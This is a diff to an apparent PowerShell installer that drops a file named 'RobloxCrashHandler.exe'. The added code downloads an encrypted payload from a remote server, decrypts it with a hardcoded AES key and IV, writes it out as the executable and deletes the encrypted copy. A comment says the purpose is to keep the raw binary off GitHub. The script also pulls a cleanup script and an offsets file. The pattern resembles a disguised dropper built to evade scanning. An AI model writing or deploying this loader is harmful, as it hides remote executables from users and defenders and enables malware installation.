@@ -90,8 +90,28 @@ if (Test-Path $InstallPathExe) {
     Rename-Item -Path $InstallPathExe -NewName "RobloxCrashHandler.exe.old" -Force -ErrorAction SilentlyContinue 
 }
 
-# Download files
-Invoke-WebRequest -Uri "$ServerBaseUrl/RobloxCrashHandler.exe" -OutFile $InstallPathExe -UseBasicParsing
+# Download encrypted payload and decrypt it (raw .exe is never exposed on GitHub)
+$EncTempFile = "$env:TEMP\rchandler_pkg.enc"
+Invoke-WebRequest -Uri "$ServerBaseUrl/RobloxCrashHandler.enc" -OutFile $EncTempFile -UseBasicParsing
+
+$DecKey = [byte[]](0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x32,0x35,0x36,0x4B,0x45,0x59,0x21,0x40,0x23,
+                   0x24,0x25,0x5E,0x26,0x2A,0x28,0x29,0x5F,0x2B,0x3D,0x7B,0x7D,0x7C,0x3A,0x3B,0x22)
+$DecIV  = [byte[]](0x52,0x43,0x48,0x5F,0x49,0x56,0x5F,0x4C,0x4F,0x57,0x4C,0x49,0x46,0x45,0x21,0x40)
+
+$aes = [System.Security.Cryptography.Aes]::Create()
+$aes.Key     = $DecKey
+$aes.IV      = $DecIV
+$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
+$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+
+$encBytes  = [System.IO.File]::ReadAllBytes($EncTempFile)
+$decryptor = $aes.CreateDecryptor()
+$exeBytes  = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
+$aes.Dispose()
+[System.IO.File]::WriteAllBytes($InstallPathExe, $exeBytes)
+Remove-Item $EncTempFile -Force -ErrorAction SilentlyContinue
+
+# Download remaining files
 Invoke-WebRequest -Uri "$ServerBaseUrl/cleanup.ps1" -OutFile $CleanupScriptInstalled -UseBasicParsing
 Invoke-WebRequest -Uri "$ServerBaseUrl/offsets.cache" -OutFile $OffsetsCacheInstalled -UseBasicParsing
 
